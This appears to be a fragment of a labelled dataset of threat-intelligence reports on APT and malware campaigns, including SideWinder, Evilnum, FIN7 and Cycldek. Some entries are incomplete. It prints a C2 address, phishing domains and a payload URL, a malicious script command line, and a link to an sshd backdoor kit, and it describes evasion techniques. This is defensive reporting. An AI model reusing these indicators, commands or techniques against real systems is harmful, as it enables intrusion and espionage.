some extensive information about the attacked devices and the log files collected, we understood that around 240 users have so far fallen victim to this surveillance campaign. In addition, due to careful documentation of the campaign by its creators showed we were able to learn that over 97% of its victims are Iranian, consistently aligning with our estimation that this campaign is of Iranian origin. In addition to the Iranian targets discovered, we also found victims from Afghanistan, Iraq and Great Britain. Interestingly, the log documentation includes the name of the malicious application used to intercept the victims’ data, as well as an Application Code Name field. This field includes a short description of the app, which leads us to believe that this is a field used by the attackers to instantly recognize the application used by the victim. Observed code names includes ‘Daesh4’ (ISIS4), ‘Military News’, ‘Weapon2’, ‘Poetry Kurdish’. Below is a visualization of the attacked devices and mobile vendors that were documented in the logs: While the number of victims and their characteristics are detailed above, the number of people affected by this operation is actually much higher. This is due to the fact that the full contact list stored in each victim’s mobile device, including full names and at least one of their phone numbers, was also harvested by the attackers. In addition, due to phone calls, SMS details, as well as the actual SMS messages, also recorded by the attackers, the private information of thousands of totally unrelated users has also been compromised.Check Point’s Mobile solutions can protect against this type of attack. For enterprises, read more about Check Point’s Sand Blast Mobile, and for consumers Check Point’s Zone Alarm Mobile, to learn how you can protect your device from malicious and invasive mobile malware.

        "explain": "A new social engineering campaign conducted by the “MuddyWater” group has been observed targeting two Israeli entities with tactics, techniques and procedures (TTPs) previously associated with this threat actor. MuddyWater, a group known for spear-phishing emails since 2020, has historically employed links and PDFs, RTFs and HTML attachments that direct victims to archives hosted on different file-sharing platforms. These archives typically contained legitimate remote administration tools. According to an advisory published by the Deep Instinct Threat Research team on Wednesday, during the Israel-Hamas conflict, MuddyWater has reused these known remote administration tools, as well as leveraging a new file-sharing service called “Storyblok.” On October 30, Deep Instinct reportedly discovered two archives hosted on Storyblok featuring a new multi-stage infection vector. This vector conceals files, including an LNK file initiating the infection and an executable file, executing an Advanced Monitoring Agent, a remote administration tool. According to the security experts, this marks the first public report of MuddyWater employing this particular remote administration tool. Read more on MuddyWater attacks: MuddyWater Uses SimpleHelp to Target Critical Infrastructure Firms At the same time, the new campaign’s initial infection mechanism likely involves a spear-phishing email, similar to past campaigns. The archive contains several hidden folders, including a deceptive LNK shortcut resembling a directory called “Attachments.” When the LNK file is opened, the infection sequence is initiated, executing the “Diagnostic.exe” file, present in both archives observed by Deep Instinct. This file then launches “Windows.Diagnostic.Document.EXE,” a legitimate installer for “Advanced Monitoring Agent.” In addition to executing the remote administration tool, “Diagnostic.exe” also opens a Windows Explorer window for the hidden “Document” folder, creating a ruse to deceive the victim. The decoy document within this campaign is an official memo from the Israeli Civil Service Commission, publicly available on their website, which outlines procedures for government workers expressing opinions against the Israeli state on social networks. After infection, MuddyWater operators likely conduct reconnaissance before executing PowerShell code, causing the infected host to communicate with a custom command-and-control (C2) server. Notably, MuddyWater recently used a new C2 framework called “MuddyC2Go.” More details about the campaign can be found on Deep Instinct’s GitHub page. The company also confirmed it will publish an additional, extended post about the findings in the near future.\n\n\n",

        "explain": "Energetic Bear/Crouching Yeti is a widely known APT group active since at least 2010. The group tends to attack different companies with a strong focus on the energy and industrial sectors. Companies attacked by Energetic Bear/Crouching Yeti are geographically distributed worldwide with a more obvious concentration in Europe and the US. In 2016-2017, the number of attacks on companies in Turkey increased significantly. The main tactics of the group include sending phishing emails with malicious documents and infecting various servers. The group uses some of the infected servers for auxiliary purposes – to host tools and logs. Others are deliberately infected to use them in waterhole attacks in order to reach the group’s main targets. Recent activity of the group against US organizations was discussed in a US-CERT advisory, which linked the actor to the Russian government, as well as an advisory by the UK National Cyber Security Centre. This report by Kaspersky Lab ICS CERT presents information on identified servers that have been infected and used by the group. The report also includes the findings of an analysis of several webservers compromised by the Energetic Bear group during 2016 and in early 2017. The table below shows the distribution of compromised servers (based on the language of website content and/or the origins of the company renting the server at the time of compromise) by countries, attacked company types and the role of each server in the overall attack scheme. Victims of the threat actor’s attacks were not limited to industrial companies.All waterhole servers are infected following the same pattern: injecting a link into a web page or JS file with the following file scheme: file://IP/filename.png.Compromised servers are in some cases used to conduct attacks on other resources. In the process of analyzing infected servers, numerous websites and servers were identified that the attackers had scanned with various tools, such as nmap, dirsearch, sqlmap, etc. (tool descriptions are provided below). The sites and servers on this list do not seem to have anything in common. Even though the scanned servers do not necessarily look like potential final victims, it is likely that the attackers scanned different resources to find a server that could be used to establish a foothold for hosting the attackers’ tools and, subsequently, to develop the attack. Part of the sites scanned may have been of interest to the attackers as candidates for hosting waterhole resources. In some cases, the domains scanned were hosted on the same server; sometimes the attackers went through the list of possible domains matching a given IP. In most cases, multiple attempts to compromise a specific target were not identified – with the possible exception of sites on the Bump platform, flight tracker servers and servers of a Turkish hotel chain. Curiously, the sites scanned included a web developer’s website, kashey.ru, and resources links to which were found on this site. These may have been links to resources developed by the site’s owner: www.esodedi.ru, www.i-stroy.ru, www.saledoor.ru Two of the PHP scripts found, ini.php and mysql.php, contained a WSO shell concatenated with the following email spamming script:A modified sshd with a preinstalled backdoor was found in the process of analyzing the server. Patches with some versions of backdoors for sshd that are similar to the backdoor found are available on GitHub, for example: https://github.com/jivoi/openssh-backdoor-kit Compilation is possible on any OS with binary compatibility. As a result of replacing the original sshd file with a modified one on the infected server, an attacker can use a ‘master password’ to get authorized on the remote server, while leaving minimal traces (compared to an ordinary user connecting via ssh). In addition, the modified sshd logs all legitimate ssh connections (this does not apply to the connection that uses the ‘master password’), including connection times, account names and passwords. The log is encrypted and is located at /var/tmp/.pipe.sock. In addition to using compromised servers to scan numerous resources, other attacker activity was also identified. After gaining access to the server, the attackers installed the tools they needed at different times. Specifically, the following commands for third-party installations were identified on one of the servers:Additionally, the attackers installed any packages and tools for Python they needed. The diagram below shows times of illegitimate logons to one of the compromised servers during one month. The attackers checked the smbtrap log file on working days. In most cases, they logged on to the server at roughly the same time of day, probably in the morning hours:In addition, in the process of performing the analysis, an active process was identified that exploited SQL injection and collected data from a database of one of the victims. The findings of the analysis of compromised servers and the attackers’ activity on these servers are as follows:\n\n\n",

        "original_label": "true",
        "label": "true",
        "explain": "A security researcher says he has uncovered an advanced persistent threat (APT) operation that started over a decade ago and which is referenced in the collection of National Security Agency (NSA) hacking tools that the Shadow Brokers made public in 2017. The campaign, which was previously attributed to Chinese threat actor Emissary Panda, which is also referred to as APT27, LuckyMouse, BRONZE UNION, and Threat Group 3390, is referenced in one of the files from the Shadow Brokers dump as SIG37. According to Juan Andres Guerrero-Saade, a security researcher who previously worked for Kaspersky and Google, SIG37 in fact points to a previously unidentified cluster of activity that might be going back as far as 2008. He has not been able to link this activity to any known threat group. The researcher, who refers to the operation as ‘Nazar’, based on “debug paths left alongside Farsi resources in some of the malware droppers,” believes that the activity was centered around the 2010-2013 timeframe, based on submission times in VirusTotal. While the scope of the operation is unclear — given the lack of access to victimology or command and control (C&C) sinkholing — three malware samples were exclusively encountered on Iranian machines, and Nazar subcomponents were submitted to VirusTotal from Iran, Guerrero-Saade says. The researcher revealed in a presentation at the OPCDE cybersecurity conference that based on the available evidence this could be an operation conducted by Iran-based hackers against entities in Iran. “Somehow, this operation found its way onto the NSA’s radar pre-2013,” Guerrero-Saade wrote in a blog post on Nazar. “As far as I can tell, it’s eluded specific coverage from the security industry. A possible scenario to account for the disparate visibility between the NSA and Western researchers when it comes to this cluster of activity is that these samples were exclusively encountered on Iranian boxes overlapping with EQGRP implants.” Nazar uses a modular toolkit, with a main dropper designed to silently register multiple DLLs as OLE controls in the Windows registry via ‘regsvr32.exe’. An orchestrator is registered as a service for persistence, disguised as ‘svchost.exe’. The droppers are built with the defunct Chilkat software, and ‘Zip2Secure’ is used to create self-extracting executables. Subcomponent DLLs feature both commonly-used resources and seemingly custom libraries. The malware leverages libraries to implement screen grabbing, microphone recording, and keylogging features, while two custom resources, which are treated as type libraries and registered as OLE controls, can enumerate attached drives, traverse folder structures, and handle some C&C functionality. A kernel driver is used to sniff packets from the victim machine’s interfaces and parse them for specific strings, but the researcher says he could not identify what it is parsing. “SIG37 has proven a rewarding mystery, unearthing a previously undiscovered subset of activity worthy of our attention. Apart from several places where more skilled reverse engineers can contribute to better understanding the samples already discovered, there’s an opportunity for threat hunters with access to diverse data sets and systems to figure out just how big this iceberg really is,” Guerrero-Saade concludes.\n\n\n",

SideWinder, also known as APT-C-17 and T-APT-04, operates from a South Asian nation-state and specializes in cyber espionage against Asian countries such as China and Pakistan, with the aim of stealing sensitive information. The group's activities have been ongoing since at least 2012 and remain highly active. The focus of their attacks are Pakistani government and military organizations. In this latest campaign, the threat actor used targeted spear-phishing emails to attack government organizations. The emails contain a PDF attachment named Adv-16-2023, masquerading as a security advisory issued by the Pakistani Cabinet Division. After the file is opened, the attacker entices the victim to download a password protected RAR file. This compressed file contains a malicious LNK file, which then downloads the second-stage payload. Through the exploitation of DLL side-loading, the attacker hijacks both the local OneDrive program and its update program, leading to the deployment of Cobalt Strike, a commonly used remote control program in penetration testing to take control of the compromised machine.Sangfor FarSight Labs intercepted a spear-phishing attachment used in the attack, named Adv-16-2023.pdf. This file masquerades as a security advisory of the same name, issued by the Cabinet Division of Pakistan and available for download on its official website (cabinet.gov.pk), as shown in the figure below.After opening the malicious PDF file, the victim is lured into downloading a RAR file of the same name. The file claims to be protected by Microsoft Azure cloud security, and a document password is provided for extraction.The unpacked RAR file contains an LNK file disguised as a PDF file using the extension “.pdf.lnk”. The user is tricked into opening the file. The details of this LNK file are as follows,After the LNK file is opened, it uses mshta.exe to download and execute the something.hta file.SideWinder APT Launches New Attacks on Pakistan Government 4 The downloaded HTA file executes VBScript to download subsequent components used in the attack. The details of this HTA file are as follows,version.dll is downloaded and placed in the local OneDrive directory. When the local 64-bit OneDrive.exe and OneDriveStandaloneUpdater.exe are executed, they are hijacked using DLL side-loading to load version.dll. Additionally, the scheduled task for updating OneDrive is used by the attacker to gain persistence on the system.The downloaded version.dll is stored in the path %LOCALAPPDATA%\\Microsoft\\OneDrive\\ and is a 64-bit file. It requires both the 64-bit version of OneDrive.exe and OneDriveStandaloneUpdater.exe to load. The details of this DLL file are as follows:37E3465D6FCCFAE6E1C29526AA015A766F8FC26CC61ED821F3E0B44D794C99EC.The exported functions, GetFileInfoSize and GetFileVersionInfoSizeW, have their memory addresses located at the same position within the binary file of OneDrive.exe. These functions are called by OneDrive.exe after importing the DLL.Within the GetFileInfoSize and GetFileVersionInfoSizeW functions, the FUN_180001120 function is invoked to decrypt and execute subsequent payloads.This function reads the .text segment of ntdll.dll in the system directory and uses it to replace the .text segment of the currently loaded ntdll.dll, effectively unhooking the functions. Any security software that monitors hooks set by ntdll.dll is rendered ineffective.By performing SHA-256 hash computation on the hardcoded 16-byte data, a 256-bit hash value is generated. This hash value is used as the decryption key for AES-256. The shellcode is decrypted using this key and subsequently executed.The executed shellcode uses a reflective loading technique to dynamically load and execute the Cobalt Strike beacon. This establishes a connection with the attacker's C2 (command-and-control) server (IP address 35.175.135.236) and gives the attacker remote control.The associated domain names finance-govpk.servehttp[.]com and csd-govpk.servehttp[.]com were identified through association analysis.The attack process related to https[:]//csd-govpk.servehttp.com/Advisory-16-2023.rar is consistent with the above analysis. However, finance-govpk.servehttp[.]com differs in that it is associated with a different phishing document, Elligible- Employee-List.xls.Victims are prompted to enable macros in Excel to view its content.Once macros are enabled, the macro code removes the prompt to display the content used to bait the victim into downloading UrlDownloadFileA, which downloads and places version.dll in the OneDrive directory to perform DLL hijacking. The function of UrlDownloadFileA is similar to the previously analyzed something.hta, but it employs a different phishing method.The domain names of ntc-govpk.servehttp[.]com, finance-govpk.servehttp[.]com, and csd-govpk.servehttp[.]com are consistent with the domain name format [xxx]govpk.servehttp.com, which multiple intelligence sources attribute to SideWinder. Additionally, the access controls implemented on the C2 server allow file downloads only from IP addresses in targeted regions such as Pakistan, which also aligns with the characteristics of this threat actor.The SideWinder APT group frequently relies on spear-phishing attacks against specific targets, which is a significant danger. They mainly target government and military organizations to steal high-tech research data and strategic information. Organizations in these sectors must remain vigilant and improve the protection of their network infrastructure. In this latest incident, the suspected SideWinder samples demonstrated a streamlined attack process that leveraged Cobalt Strike. Security vendors need to strengthen their detection capabilities to see such techniques. The Sangfor FarSight Labs APT Team specializes in tracking and analyzing global advanced threat incidents. It possesses a powerful external threat monitoring system with automated analysis and attribution system. This enables the team to rapidly and accurately analyze and correlate attack samples used by APT groups. Additionally, it has built and refined detailed profiles of many APT and hacker groups. The team’s expertise has successfully helped customers mitigate numerous APT and security incidents. As cyber defenses evolve, cybercriminals will research and employ new tactics, techniques, and procedures (TTP). The Sangfor FarSight Labs APT Team is committed to in-depth research and analysis of newly discovered security events worldwide to keep organizations secure.\n\n\n",

        "original_label": "true",
        "label": "true",
        "explain": "Recently, experts at AdaptiveMobile Security discovered a method of attack on mobile phones that can be carried out using a normal computer and a dirt-cheap USB modem. Whereas some older methods of cellular surveillance required special equipment and a telecom operating license, this attack, called Simjacker, takes advantage of a vulnerability found in SIM cards.Most SIM cards released since the early 2000s, including eSIM, feature a carrier menu. This menu includes tasks such as Balance Check, Recharge, Technical Support, and sometimes extras such as Weather, or even Horoscope, and so on. Old phones had it right in the main menu. iOS buries it deep in the Settings (under SIM Application), and in Android smartphones it’s a standalone app called SIM Toolkit. The menu is essentially an app — or more precisely, several apps with the general name SIM Toolkit (STK) — but these programs do not run on the phone itself, but on the SIM card. Remember that your SIM card is in fact a tiny computer with its own operating system and programs. STK responds to external commands, such as buttons pressed on the carrier menu, and makes the phone perform certain actions, such as sending SMS messages or USSD commands. One of the apps included in the STK is called S@T Browser. It is used for viewing Web pages of a certain format and pages located on the carrier’s internal network. For example, S@T Browser can supply information about your account balance. The S@T Browser app has not been updated since 2009, and although in modern devices its functions are performed by other programs, S@T Browser is still actively used — or at the very least, is still installed on many SIM cards. Researchers have not named specific regions or telcos that sell SIM cards with this app installed, but they claim more than 1 billion people in no fewer than 30 countries use it, and it is in S@T Browser that the abovementioned vulnerability was discovered.The attack begins with an SMS message containing a set of instructions for the SIM card. Following these instructions, the SIM card queries the mobile phone for its serial number and the Cell ID of the base station in whose coverage zone the subscriber is located, and sends an SMS response with this information to the attacker’s number. Base station coordinates are known (and even available online), so the Cell ID can be used to determine the location of the subscriber within several hundred meters. Location-based services in particular rely on the same principle for determining location without satellite assistance, for example, indoors or when GPS is turned off. All fiddling with the hacked SIM card is totally invisible to the user. Neither incoming SMS messages with commands, nor replies with device location data are displayed in the Messages app, so Simjacker victims are likely not even aware that they are being spied on.According to AdaptiveMobile Security, spies have been tracking the location of people in several unspecified countries. And in one of them, about 100–150 numbers are compromised every day. Typically, requests are sent no more than once a week; however, some victims’ movements are monitored far more closely — the research team noticed that several recipients were sent several hundred malicious SMS messages per week.As the researchers noted, the cybercriminals did not use all SIM card capabilities possible with S@T Browser. For example, SMS can be used to make the phone call any number, send messages with random text to arbitrary numbers, open links in the browser, and even disable the SIM card, leaving the victim effectively phoneless. The vulnerability opens up numerous potential attack scenarios — criminals can transfer money by SMS to a bank number, call premium-rate short numbers, open phishing pages in the browser, or download Trojans. The vulnerability is particularly dangerous because it does not depend on the device on which the vulnerable SIM card is inserted; the STK command set is standardized and supported by all phones and even IoT devices with a SIM. For some operations, such as making a call, some gadgets request user confirmation, but many do not.Unfortunately, no stand-alone method exists for users to stop SIM card attacks. It is the duty of mobile carriers to ensure their customers’ security. Above all, they should avoid using outdated SIM menu apps, as well as block SMS code containing dangerous commands. But there’s some good news. Although no expensive hardware is necessary to perform the attack, it does require fairly in-depth technical knowhow and special skills, which means that the method is not likely to be deployed by every cybercriminal and his dog. What’s more, the researchers notified the developer of S@T Browser, SIMalliance, of the vulnerability. In response, the company issued a set of security guidelines for carriers that use the app. The Simjacker attacks were also reported to the GSM Association, an international organization that represents the interests of mobile carriers all over the world. So it is hoped that companies will take all necessary protective measures at the earliest opportunity.\n\n\n",

        "explain": "Since the beginning of 2022, ThreatLabz has been closely monitoring the activities of the Evilnum APT group. We identified several instances of their low-volume targeted attack campaigns launched against our customers in the UK and Europe region. The new instances of the campaign use updated tactics, techniques, and procedures. In earlier campaigns observed in 2021, the main distribution vector used by this threat group was Windows Shortcut files (LNK) sent inside malicious archive files (ZIP) as email attachments in spear phishing emails to the victims. In the most recent instances, the threat actor has started using MS Office Word documents, leveraging document template injection to deliver the malicious payload to the victims’ machines. In this blog, we present the technical details of all components involved in the end-to-end attack chain. At the time of writing, to the best of our knowledge, the complete attack chain of this new instance of Evilnum APT group is not publicly documented anywhere. ThreatLabz has identified several domains associated with Evilnum APT group which have not been previously detected by security vendors. This discovery indicates that the Evilnum APT group has been successful at flying under the radar and has remained undetected for a long time. The key targets of the Evilnum APT group have predominantly been in the FinTech (Financial services) sector, specifically companies dealing with trading and compliance in the UK and Europe. In March 2022, we observed a significant update in the choice of targets of Evilnum APT group. They targeted an Intergovernmental organization which deals with international migration services. The timeline of the attack and the nature of the chosen target coincided with Russia-Ukraine conflict. Macro-based documents used in the template injection stage leveraged VBA code stomping technique to bypass static analysis and also to deter reverse engineering. A heavily obfuscated JavaScript was used to decrypt and drop the payloads on the endpoint. The JavaScript configured a scheduled task to run the dropped binary. This JavaScript has significant improvements in the obfuscation technique compared to the previous versions used by EvilNum APT group. The names of all the file system artifacts created during the course of execution were chosen carefully by the threat actor to spoof legitimate Windows and other legitimate third party binaries' names. In each new instance of the campaign, the APT group registered multiple domain names using specific keywords related to the industry vertical targeted.For the purpose of technical analysis we will consider the document with MD5: 0b4f0ead0482582f7a98362dbf18c219 . The stage 1 malicious document is delivered via spear phishing email. Once the user downloads and opens the malicious document, it fetches the stage 2 macro template from the attacker-hosted domain and displays the decoy content as shown in Figure 2 asking the user to enable the macro content.The stage 2 template contains the main malicious macro code. It makes use of VBA code stomping technique which is fairly uncommon in the wild. This technique destroys the original source code and only a compiled version of the VBA macro code (also known as p-code) is stored in the document. As a result, this technique prevents static analysis tools such as olevba from extracting the decompiled VBA code. Using the technique mentioned by the Walmart team here, we were able to extract the full macro code. All the strings in the macro code are decrypted using the string decryption function shown in Figure 3.Below are the key functionalities of the macro. 1. The document file has two text boxes with encrypted contents. These textboxes will be decrypted at run time by the VBA macro code. a) Textbox 1 - msform_ct.TextBox1.Text. This will be decrypted and contents will be written to %appdata%\\“ThirdPartyNotices.txt” b) Textbox 2 - msform_ct.TextBox2.Text - This will be decrypted and contents will be written to “%appdata%\\Redist.txt” 2. Copies the legitimate Windows binary Wscript.exe to a file with the name “msdcat.exe”. Such file copy operations are done by malwares as a way to bypass endpoint security products. 3. The file - Redist.txt contains the obfuscated JavaScript which will be executed with the following command line: msdcat.exe /E:jscRipt “%appdata%\\Redist.txt” dg ThirdPartyNotices.txt Note: “dg” is a hard coded command line parameter present inside the VBA macro code. 4. During the course of execution of VBA macro code, there are multiple calls to doc.Shapes.AddPicture() which fetches a JPG image from the attacker-controlled server. We believe this was done by the attacker to trace and log the execution of code on the endpoint. One such example is shown in Figure 4. There is a call to doc.Shapes.AddPicture() between the building of the command line and the execution of the command line.The original JavaScript dropped by the VBA-based macro code is heavily obfuscated. We will highlight some of the unique obfuscation techniques used which are rarely observed in obfuscated JavaScripts. There are two parameters passed to this JavaScript at the time of execution with following command line: msdcat.exe /E:jscRipt “C:\\Users\\user\\AppData\\Roaming\\Redist.txt” dg ThirdPartyNotices.txt parameter 1: “dg”. This string is later used in the string decryption function in JavaScript. parameter 2: The file “ThirdPartyNotices.txt” contains the encrypted code which will be decrypted and dropped by the JavaScript on the filesystem with binary name - SerenadeDACplApp.exe Most obfuscation techniques involve a large array of encrypted and encoded strings which are referenced throughout the code using indexes. A common approach to deobfuscate this requires multiple “search and replace” operations where you replace the reference with the actual decrypted and decoded string. JavaScript in this case used an interesting technique where the original array of strings was shuffled, and would be unshuffled in memory at the time of execution. So, any attempt to dereference the strings without unshuffling the array would result in an error. Such a method can be used to deter reverse engineering and also bypass some tools which try to automate the process of deobfuscation. Let's look at it in more detail. Figure 5 below shows the huge array of strings defined at the beginning of the JavaScript. This array is wrapped inside a function as an extra layer of obfuscation.The next step is to unshuffle the array. Figure 6 below shows the relevant JavaScript code which uses a brute force approach to unshuffle the array. It has a predefined seed of value “0x6467a”. Upon each iteration, the function computes a seed using various mathematical operations and compares it with the predefined seed “0x6467a”. The function continues to shift the contents of the array by one position to the right until this condition is satisfied. Relevant comments are included in the code to illustrate the unshuffling logic.Other techniques used for obfuscation involve control flow flattening techniques which leverage switch-case obfuscation. Figure 7 shows one of the string decryption functions which uses such an obfuscation technique.The sequence of steps of decryption are shuffled using switch-case and the order is followed according to the following sequence: “15|12|3|2|14|5|1|10|9|17|8|7|6|4|13|16|0|11” It means, “case 15” is executed followed by “case 12” and so on. The final “case 11” returns the decrypted string. We can re-write the string decryption function as shown in Figure 8 which is easier to analyze.The threat actor achieves persistence via Scheduled task. During JavaScript execution, a scheduled task with the name “UpdateModel Task'' will be created to execute the dropped loader binary with required command line arguments.Once all the above operations are done. The backdoor selects one of the C2 domains and a path string from the configuration and sends the beacon network request. If the beacon request is successful, the backdoor will query the server for available content and download it. Based on the content size two different operations are performed:\n\n\n",

        "explain": "Morphisec Labs has been tracking FIN7 (Carbanak Group) activity for the past several years. Morphisec’s ability to collect rich forensic data from memory has provided unique visibility into multiple FIN7 campaigns that our researchers were proud to share with MITRE and the InfoSec community at large. FIN7 is a well-funded, financially motivated cybercrime group. Their advanced techniques and tactics were even emulated in the third round of the MITRE ATT&CK evaluations. This report presents an attack chain that was intercepted and prevented within a customer’s network in December 2020, then will focus on a component from a typical FIN7 attack chain – JSSLoader. Though JSSLoader is well known as a minimized .NET RAT, not many details have been publicly available with respect to various capabilities such as exfiltration, persistence, auto-update, malware downloading, and more. Furthermore, in the many occasions where JSSLoader is mentioned, there are few details on the complete attack chain. The following provides a never-before-seen technical analysis of this infamous group’s JSSLoader as part of an end-to-end attack. Below is an example of a typical phishing campaign that may lead to a FIN7 JSSLoader compromise as well as to other malwares such as Qbot; the traffic is then redirected through BlackTDS traffic distribution system. In this example, an email is sent from “Natural Health Sherpa” with an invoice to pay from Quickbooks. This VBScript downloads and executes the next stage’s VBScript in memory. This second stage was recently introduced. The in-memory script downloads and writes a .NET module (JSSLoader) on disk, then executes the module through a scheduled task with a newly introduced timeout delay to bypass attack chain monitoring. It is worth mentioning that the early versions of the VB scripts have a strong resemblance to the ongoing QBOT campaign that may lead to an Egregor compromise. The JSSLoader is a RAT (Remote Access Trojan) with multiple capabilities that were introduced over time. These various capabilities are documented throughout this report. In the specific attack chain that was recently intercepted, the RAT typically executes a Takeout which is responsible for the reflective loading and execution of a Carbanak. Not surprisingly, the C2 hosting provider is a company named FranTech Solutions, which has been used before by the FIN7 group. As mentioned in the introduction, the early VBScripts had a resemblance to the QBOT attacks seen earlier this year – QBOT-VBS. The VBScript decodes a list of commands and a URL. This URL is used to download the next stage, the JSSLoader. After downloading and saving the JSSLoader into the %temp% directory, it will create a scheduled task that executes the file. In the QBOT campaigns, a QBOT executable is the next stage instead of the JSSLoader. Newer VBScripts are divided into two stages. The first one just downloads and executes the second VBScript from /margaritaThe downloaded VBScript decodes and executes the in-memory VBScript that then downloads and executes the next stage JSSloader through a scheduled task, possibly to avoid sequential monitoring of the attack chain. URLs to the JSSLoader have a similar pattern – /.eml.From late October 2020, the adversaries moved to a WSF (Windows Script File) as the first stage script. Basically, they wrapped the VBScript from the older version into a WSF. JSSLoader is a highly maintained minimized .NET RAT backdoor, mostly used by the FIN7 group. It includes the following functionality:The following will begin with the most recent sample of the JSSLoader together with its followup stages, then it will track its evolution over the past year, skipping over any minor changes.As with many other downloaders, the first exfiltrated information is a precondition for the next execution stage. The RAT collects the following:The next stage execution went through a significant evolution over the past year. Immediately following a persistence stage, the RAT will wait for a base64 encoded command string to be delivered via a ‘Get’ command from the same domain the data had been sent to. As with previous communication attempts, SSL certificate errors will be ignored and the unique victim ID will be sent as part of the request.The delivered command is parsed into an array of lines (using new line delimiter), then the real command is extracted from between the quotes of the longest line in the array. This string is then written into a file on disk, which is later parsed by a pre-built PowerShell command described below. In most cases the string is a compressed stream.The executed PowerShell script is known as a Takeout script. Multiple variations of the Takeout script mainly differ on how they extract the next stage of in-memory execution through the use of the “$body” parameter, a simple retrohunt in VirusTotal shows Takeouts with a full embedded “$body”. In this case, the PowerShell script reads the content of a previously written command file as described above, decompresses it in memory, and executes the second layer PowerShell. The second layer PowerShell reflectively maps a Carbanak to memory.If there is one thing this analysis shows us, it’s that these threats are a moving target. Thwarting them can only be achieved by outpacing their advancements, and knowledge sharing is one of the best ways to do this. MITRE ATT&CK is the first place that comes to mind when it comes to knowledge sharing and collaboration around adversarial techniques and tactics. Threat actors like FIN7 are among a long list of groups that MITRE tracks. This list shows that FIN7’s JSSLoader is no exception when it comes to evolving threats. Threat actors constantly change their techniques, continuously evade detection, and achieve their adversarial goals despite the security controls that are in place. It takes a new approach to end this cycle. Morphisec’s R&D team is dedicated to developing technology that does not rely on detecting techniques because those are always subject to change. Instead, Morphisec prevents the non-negotiable tactics that the adversaries rely on to achieve their goals no matter how many times they evolve their malware. As these new and unknown threats like this one are prevented, rich forensic data is collected, analyzed, and shared with the community via our Moving Target Defense Blog.\n\n\n",

        "explain": "While investigating attacks related to a group named Cycldek post 2018, we were able to uncover various pieces of information on its activities that were not known thus far. In this blog post we aim to bridge the knowledge gap on this group and provide a more thorough insight into its latest activities and modus operandi. Here are some key insights that will be described in this publication:Cycldek is a long-known Chinese-speaking threat actor. Based on the group’s past activity, it has a strong interest in Southeast Asian targets, with a primary focus on large organizations and government institutions in Vietnam. This is evident from a series of targeted campaigns that are publicly attributed to the group, as outlined below:Most attacks that we observed after 2018 start with a politically themed RTF document built with the 8.t document builder (also known as ‘Royal Road’) and sent as a phishing mail to the victims. These documents are bundled with 1-day exploits (e.g. CVE-2012-0158, CVE-2017-11882, CVE-2018-0802) which in turn run a dropper for three files:The final payload that is run in memory is malware known as NewCore RAT. It is based on an open-source framework named PcShare or PcClient that used to be prevalent in Chinese hacker forums more than a decade ago. Today, the software is fully available on Github, allowing attackers to leverage and modify it for their needs. In the case of Cycldek, the first public accounts of the group’s usage of NewCore date back to 2017. As described in a blog post by Fortinet, the malware provides the attacker with broad capabilities such as conducting a range of operations on files, taking screenshots, controlling the machine via a remote shell and shutting down or restarting the system.When inspecting the NewCore RAT malware delivered during the various attacks we investigated, we were able to distinguish between two variants. Both were deployed as side-loaded DLLs and shared multiple similarities, both in code and behavior. At the same time, we noticed differences that indicate the variants could have been used by different operators. Our analysis shows that the underlying pieces of malware and the way they were used form two clusters of activity. As a result, we named the variants BlueCore and RedCore and examined the artifacts we found around each one in order to profile their related clusters. Notable characteristics of each cluster’s implant are summarized in the table below.As demonstrated by the table, the variants share similar behavior. For example, both use DLL load order hijacking to run code from DLLs impersonating dependencies of legitimate AV utilities and both share a mutex naming convention of random UUIDs, where mutexes are used for synchronization of thread execution. By comparing code in both implants, we can find multiple functions that originate from the PCShare RAT; however, several others (like the injection code in the figure below) are proprietary and demonstrate identical code that may have been written by a shared developer.Moreover, both implants leverage similar injected shellcode used to load the RedCore and BlueCore implants. This shellcode, which resides in the files ‘stdole.tlb’ and ‘msgsm64.acm’, contains a routine used to decrypt the implants’ raw executable from an embedded blob, map it to memory and execute it from its entry point in a new thread. Since both pieces of shellcode are identical for the two variants and cannot be attributed to any open source project, we estimate that they originate from a proprietary shared resource. Having said that, it is also evident that there are differences between the variants. The clearest distinctions can be made by looking at malware functionality that is unique to one type of implant and absent from the other. The following are examples of features that could be found only in RedCore implants, suggesting that despite their similarity with BlueCore, they were likely used by a different entity for different purposes: Perhaps the most notable difference between the two implants is the URL scheme they use to connect and beacon their C&C servers. By looking for requests made using similar URL patterns in our telemetry, we were able to find multiple C&C servers and divide the underlying infrastructure based on the aforementioned two clusters. The requests by each malware type were issued only by legitimate and signed applications that were either leveraged to side-load a malicious DLL or injected with malicious code. All of the discovered domains were used to download further samples. The conclusion that we were able to reach from this is that while all targets were diplomatic and government entities, each cluster of activity had a different geographical focus. The operators behind the BlueCore cluster invested most of their efforts on Vietnamese targets with several outliers in Laos and Thailand, while the operators of the RedCore cluster started out with a focus on Vietnam and diverted to Laos by the end of 2018. The statistics of these activities, based on the number of detected samples we witnessed downloaded from each cluster of C&Cs, are outlined in the figures below.Furthermore, considering both differences and similarities, we are able to conclude that the activities we saw are affiliated to a single actor, which we refer to as Cycldek. In several instances, we spotted unique tools crafted by the group that were downloaded from servers of both groups. One example of this, which can be seen in the figure below, is a tool custom built by the group named USBCulprit. Two samples of it were downloaded from both BlueCore and RedCore servers. A more comprehensive list can be found in the Appendix. All in all, this suggests the entities operating behind those clusters are sharing multiple resources – both code and infrastructure – and operating under a single organizational umbrella. During the analysis, we were able to observe a variety of tools downloaded from both BlueCore and RedCore implants used for either lateral movement in the compromised networks or information stealing from infected nodes. There were several types of these tools – some were proprietary and formerly unseen in the wild; others were pieces of software copied from open-source post-exploitation frameworks, some of which were customized to complete specific tasks by the attackers. As in the cases of RedCore and BlueCore, the downloaded tools were all invoked as side-loaded DLLs of legitimate signed applications. Such applications included AV components like wsc_proxy.exe (Avast remediation service), qcconsol.exe and mcvsshld.exe (McAfee components), as well as legitimate Microsoft and Google utilities like the resource compiler (rc.exe) and Google Updates (googleupdate.exe). These tools could be used in order to bypass weak security mechanisms like application whitelisting, grant the malware additional permissions during execution or complicate incident response. As already mentioned, the bulk of these tools are common and widespread among attackers, sometimes referred to as living-off-the-land binaries, or LOLbins. Such tools can be part of open-source and legitimate software, abused to conduct malicious activities. Examples include BrowserHistoryView (a Nirsoft utility to obtain browsing history from common browsers), ProcDump (Sysinternals tools used to dump memory, possibly to obtain passwords from running processes), Nbtscan (command line utility intended to scan IP networks for NetBIOS information) and PsExec (Sysinternals tools used to execute commands remotely in the network, typically used for lateral movement). The rest of the tools were either developed fully by the attackers or made use of known tools that were customized to accommodate particular attack scenarios. The 